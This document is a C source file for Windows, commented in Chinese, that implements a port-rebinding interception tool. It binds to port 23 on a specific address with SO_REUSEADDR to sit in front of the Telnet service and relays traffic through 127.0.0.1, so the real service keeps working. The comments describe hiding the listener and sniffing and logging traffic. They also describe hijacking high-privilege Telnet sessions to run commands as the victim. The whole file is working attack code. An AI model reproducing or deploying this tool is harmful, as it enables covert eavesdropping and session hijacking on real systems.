#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(lib, "ws2_32.lib")
DWORD WINAPI ClientThread(LPVOID lpParam);
int main()
{
WORD wVersionRequested;
DWORD ret;
WSADATA wsaData;
BOOL val;
SOCKADDR_IN saddr;
SOCKADDR_IN scaddr;
int err;
SOCKET s;
SOCKET sc;
int caddsize;
HANDLE mt;
DWORD tid;

wVersionRequested = MAKEWORD( 2, 2 );
err = WSAStartup( wVersionRequested, &wsaData );
if ( err != 0 ) {
printf("error!WSAStartup failed!\n");
return -1;
}
saddr.sin_family = AF_INET;
/*
截听虽然也可以将地址指定为INADDR_ANY，但是要不能影响正常应用情况下，应该指定具体的IP，
留下127.0.0.1给正常的服务应用，然后利用这个地址进行转发，就可以不影响对方正常应用了
*/
saddr.sin_addr.s_addr = inet_addr("192.168.0.60"); 
saddr.sin_port = htons(23);
if((s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==SOCKET_ERROR)
{
printf("error!socket failed!\n");
return -1;
}
val = TRUE;
//SO_REUSEADDR选项就是可以实现端口重绑定的
if(setsockopt(s,SOL_SOCKET,SO_REUSEADDR,(char *)&val,sizeof(val))!=0)
{
printf("error!setsockopt failed!\n");
return -1;
}
//如果指定了SO_EXCLUSIVEADDRUSE，就不会绑定成功，返回无权限的错误代码；
//如果是想通过重利用端口达到隐藏的目的，就可以动态的测试当前已绑定的端口哪个可以成功，就说明具备这个漏洞，然后动态利用端口使得更隐蔽
//其实UDP端口一样可以这样重绑定利用，这儿主要是以TELNET服务为例子进行攻击
if(bind(s,(SOCKADDR *)&saddr,sizeof(saddr))==SOCKET_ERROR)
{
ret=GetLastError();
printf("error!bind failed!\n");
return -1;
}
listen(s,2); 
while(1)
{
caddsize = sizeof(scaddr);
//接受连接请求
sc = accept(s,(struct sockaddr *)&scaddr,&caddsize);
if(sc!=INVALID_SOCKET)
{
mt = CreateThread(NULL,0,ClientThread,(LPVOID)sc,0,&tid);
if(mt==NULL)
{
printf("Thread Creat Failed!\n");
break;
}
}
CloseHandle(mt);
}
closesocket(s);
WSACleanup();
return 0;
}
DWORD WINAPI ClientThread(LPVOID lpParam)
{
SOCKET ss = (SOCKET)lpParam;
SOCKET sc;
char buf[4096];
SOCKADDR_IN saddr;
long num;
DWORD val;
DWORD ret;
//如果是隐藏端口应用的话，可以在此处加一些判断
//如果是自己的包，就可以进行一些特殊处理，不是的话通过127.0.0.1进行转发

saddr.sin_family = AF_INET;
saddr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
saddr.sin_port = htons(23);
if((sc=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==SOCKET_ERROR)
{
printf("error!socket failed!\n");
return -1;
}
val = 100;
if(setsockopt(sc,SOL_SOCKET,SO_RCVTIMEO,(char *)&val,sizeof(val))!=0)
{
ret = GetLastError();
return -1;
}
if(setsockopt(ss,SOL_SOCKET,SO_RCVTIMEO,(char *)&val,sizeof(val))!=0)
{
ret = GetLastError();
return -1;
}
if(connect(sc,(SOCKADDR *)&saddr,sizeof(saddr))!=0)
{
printf("error!socket connect failed!\n");
closesocket(sc);
closesocket(ss);
return -1;
}
while(1)
{
//下面的代码主要是实现通过127.0.0.1这个地址把包转发到真正的应用上，并把应答的包再转发回去。
//如果是嗅探内容的话，可以再此处进行内容分析和记录
//如果是攻击如TELNET服务器，利用其高权限登陆用户的话，可以分析其登陆用户，然后利用发送特定的包以劫持的用户身份执行。
num = recv(ss,buf,4096,0);
if(num>0)
send(sc,buf,num,0);
else if(num==0)
break;
num = recv(sc,buf,4096,0);
if(num>0)
send(ss,buf,num,0);
else if(num==0)
break;
}
closesocket(ss);
closesocket(sc);
return 0 ;
} 

